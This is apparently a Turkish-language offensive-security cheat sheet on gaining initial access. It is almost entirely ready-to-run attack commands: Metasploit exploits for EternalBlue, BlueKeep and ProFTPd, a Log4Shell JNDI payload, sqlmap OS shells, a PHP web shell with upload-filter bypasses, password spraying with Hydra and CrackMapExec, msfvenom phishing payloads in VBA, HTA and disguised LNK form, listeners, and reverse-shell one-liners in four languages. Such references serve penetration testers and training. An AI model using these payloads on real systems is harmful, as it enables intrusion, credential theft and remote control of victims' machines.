# 🚪 Faz 1: İlk Erişim (Initial Access)

[🇬🇧 English](../01-Initial-Access.md) • [🇮🇹 Versione Italiana](01-Initial-Access.it.md)

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Hedef:** Hedef ağ veya sistem üzerinde ilk tutunma noktasını (foothold) elde etmek.

---

## 🎯 Saldırı Vektörleri

| Vektör | Açıklama |
|--------|----------|
| **Dışa Açık Uygulama İstismarı** | Web uygulamaları, API'ler, CMS güvenlik açıkları |
| **Oltalama (Phishing)** | Zararlı ek veya link içeren e-postalar |
| **Geçerli Kimlik Bilgileri** | Parola püskürtme (spray), sızdırılmış veri denemeleri (stuffing) |
| **Dış Servisler** | İnternete açık RDP, SSH, VPN, FTP servisleri |
| **Tedarik Zinciri (Supply Chain)** | Güvenilir üçüncü parti yazılımların manipülasyonu |

---

## 💻 Bilinen Güvenlik Açıklarının İstismarı

### Exploit Arama
```bash
# SearchSploit - Yerel exploit veritabanı
searchsploit apache 2.4
searchsploit -m 41234         # Exploiti mevcut dizine kopyalar
searchsploit --nmap scan.xml   # Nmap XML çıktısını tarayarak uygun exploitleri bulur

# Metasploit içinde exploit arama
msfconsole -q -x "search type:exploit apache"
```

### Yaygın Kritik Exploitler

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Hedefin zafiyetli olup olmadığını kontrol etme
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Metasploit ile istismar
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Zafiyet kontrolü
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Exploit sunucusu ayağa kaldırma
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell / ProxyLogon - Microsoft Exchange
```bash
# ProxyShell taraması
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Exploit kullanımı
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🌐 Web Uygulama Saldırıları

### SQL Injection ile Shell Alma
```bash
# SQLi tespiti
sqlmap -u "http://target.com/page?id=1" --batch

# SQLi üzerinden işletim sistemi kabuğu (OS Shell)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Veritabanı yönetim kabuğu (SQL Shell)
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### Dosya Yükleme (File Upload) ile Shell Alma
```bash
# PHP Meterpreter reverse shell oluşturma
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# Veya basit bir PHP komut kabuğu
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Uzantı filtrelerini atlatma (Bypass) varyasyonları:
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Uzaktan Kod Çalıştırma (RCE)
```bash
# RCE kontrolü
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# RCE üzerinden Reverse Shell tetikleme
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔐 Kimlik Bilgisi Saldırıları (Credential Attacks)

### Parola Püskürtme (Password Spraying)
```bash
# CrackMapExec - SMB servisi
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM servisi
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH servisi
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP servisi
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Credential Stuffing (Sızıntı Verisi Deneme)
```bash
# Sızdırılmış kullanıcı:parola çiftleriyle deneme
hydra -C creds.txt ftp://192.168.1.10

# creds.txt biçimi:
# kullanici_adi:parola
```

### Varsayılan Kimlik Bilgileri (Default Credentials)
```bash
# Sık kullanılan varsayılan kombinasyonlar:
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec ile varsayılan parola testi
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 📧 Oltalama (Phishing) Yükleri

### Office Makro Yükü
```bash
# VBA makro payload'ı üretme
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# Veya msfconsole içindeki makro oluşturucu:
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### HTA Yükü
```bash
# HTA dosyası oluşturma
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# HTTP sunucusunda barındırma
python3 -m http.server 80
```

### LNK (Zararlı Kısayol) Yükü
```powershell
# PowerShell ile zararlı LNK dosyası oluşturma
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🖥️ Dış Servis İstismarı (External Services)

### RDP İstismarı
```bash
# RDP parola kırma
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708) istismarı
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### SSH İstismarı
```bash
# SSH parola kırma
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Bilinen kullanıcı/parola ile bağlanma
ssh user@192.168.1.10

# Özel anahtar (private key) ile bağlanma
ssh -i id_rsa user@192.168.1.10
```

### FTP İstismarı
```bash
# Anonim (Anonymous) giriş testi
ftp 192.168.1.10
# Kullanıcı: anonymous
# Parola: anonymous

# FTP parola kırma
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# ProFTPd mod_copy istismarı
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🎧 Dinleyici (Listener) Kurulumu

### Netcat Dinleyicisi
```bash
nc -lvnp 4444
```

### Metasploit Çoklu İşleyici (Multi Handler)
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell Dinleyicisi)
```powershell
# Saldırgan makinede dinleyici:
powercat -l -p 4444

# Kurban makinede ters bağlantı:
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 📊 Hızlı Başvuru Tablosu

### Tek Satırlık Ters Kabuk (Reverse Shell One-Liners)

| İşletim Sistemi / Dil | Komut |
|-----------------------|-------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔗 İlgili Kılavuzlar

- [Metasploit](../../Metasploit/README.md)
- [SQLMap](../../SQLMap/README.md)
- [Hydra](../../Hydra/README.md)
- [Web Zafiyetleri](../../SSRF/README.md)

---

**Sonraki Aşama:** [02 - Keşif ve Numaralandırma (Enumeration) →](./02-Enumeration.tr.md)
